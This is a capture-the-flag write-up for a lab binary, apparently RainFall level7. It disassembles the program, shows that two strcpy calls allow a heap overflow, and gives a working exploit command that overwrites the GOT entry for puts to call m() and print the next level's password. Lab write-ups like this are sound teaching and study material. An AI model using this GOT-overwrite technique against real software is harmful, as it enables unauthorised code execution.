# Level7

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20                       // Allocate a 0x20 (32) bytes stack
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8            // Put the value 8 on top of the stack
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>         // Call malloc
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax       // Put the result at 0x1c on the stack
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]       // Point to it with eax
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1            // Change the value of eax to 1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8            // Put the value 8 on top of the stack
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>         // Call malloc
   0x08048550 <+47>:    mov    edx,eax                        // Save the result of malloc in edx
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]       // Point to the first malloc result with eax
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx        // Put the result of the second malloc 4 bytes after eax
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8            // Put the value 8 on top of the stack
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>         // Call malloc
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax       // Put the result at 0x18 on the stack
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]       // Point to it with eax
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2            // Change the value of eax to 2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8            // Put the value 8 on top of the stack
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>         // Call malloc
   0x0804857f <+94>:    mov    edx,eax                        // Save the result in edx
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]       // Put into eax the result of the 3rd malloc
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx        // Put the result of the 4th malloc 4 bytes after eax
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]        // Point to argv with eax
   0x0804858b <+106>:   add    eax,0x4                        // Add 4 bytes -> argv[1]
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]            // Get the value of argv[1]
   0x08048590 <+111>:   mov    edx,eax                        // Copy it in edx
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]       // Point to the first malloc result with eax
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]        // Move 4 bytes further, so that's the result of the second malloc
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx        // Put edx (argv[1]) as second argument in the stack
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax            // Put eax as firt argument in the stack
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>         // Call strcpy
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]        // Point to argv with eax
   0x080485a8 <+135>:   add    eax,0x8                        // Add 8 to eax -> argv[2]
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]            // Get the value of argv[2]
   0x080485ad <+140>:   mov    edx,eax                        // Move it to edx
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]       // Move what is at 0x18 on the stack in eax (3rd malloc)
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]        // Add 4 bytes to that (4th malloc)
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx        // Put edx (argv[2]) as second argument on the stack
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax            // Put eax as first argument on the stack
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>         // Call strcpy
   0x080485c2 <+161>:   mov    edx,0x80486e9                  // Move into edx the string "r"
   0x080485c7 <+166>:   mov    eax,0x80486eb                  // Move into eax the string "/home/user/level8/.pass"
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx        // Put edx as second argument
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax            // Put eax as first argument
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>          // Call fopen
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax        // Put the result of fopen as 3rd argument
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44       // Put 0x44 (68) as second argument 
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960      // Put an empty string as first argument
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>          // Call fgets
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703      // Put the string "~~" as first argument
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>           // Call puts
   0x080485fc <+219>:   mov    eax,0x0                        // Reset eax to 0
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
End of assembler dump.
```

The code is already quite dense but can be summarized like this in c pseudo-code :

```c
struct data {
  int   num;
  char *buf;
};

char c[32]; // global variable

int main() {
    struct data *a = malloc(8);
    a->num = 1;
    a->buf = malloc(8);

    struct data *b = malloc(8);
    b->num = 2;
    b->buf = malloc(8);

    strcpy(a->buf, argv[1]);

    strcpy(b->buf, argv[2]);

    FILE* file = fopen("/home/user/level8/.pass", "r");

    fgets(c, 68, file);

    puts("~~");
}
```

Now let’s read the other functions :

```nasm
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18                             // Allocate a 0x18 (24) bytes stack
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0                  // Set the first argument on stack to 0
   0x08048501 <+13>:    call   0x80483d0 <time@plt>                 // Call time
   0x08048506 <+18>:    mov    edx,0x80486e0                        // Put into edx the string "%s - %d\n"
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax              // Move as 3rd argument the result of time
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960        // Move as second argument an empty string
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx                  // Move as first argument edx
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>               // Call printf
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

The vulnerability comes from `strcpy` once again. We need to overflow the buffer(s) to call the function `m()` in some way.

`fgets`'s result is in the string located at `0x8049960`, which is also the address read by `printf` in `m()` , that should give us the password !

This time there is an instruction `ret` so maybe we can overwrite `main`'s return address to `m()`'s address.

We write into 2 allocated buffers with strcpy in 2 different structs. Each one has as value the address of its content, which means that we can change what it points to. We want to make  `b->buf` point to the GOT. Using the first `strcpy`, we will overflow the buffer to change the address of `b->buf` ! And then we will just copy the address of `m()` into it using the second `strcpy` in order to call it instead of `puts`.

- argv[1] → overflow to make `b->buf` point to GOT of puts
- argv[2] → address of `m()` that will be copied inside of `b->buf`

We allocate a size of 8 (that is actually more because of the metadata and the alignment) and then we know that the locals are at adjacent addresses, so we add 4 more bytes for int num of the second struct, and finally the second buf that we want to affect :

8 + [`malloc` additional size] + 4 = 12 + [`malloc` additional size] bytes

In the previous exercise, the additional size required by `malloc` was 8 bytes so we will try with it at first (12 + 8 = 20 bytes).

The GOT address of puts :

```bash
(gdb) print puts
$1 = {<text variable, no debug info>} 0x8048400 <puts@plt>
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
```

```bash
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1744741933
```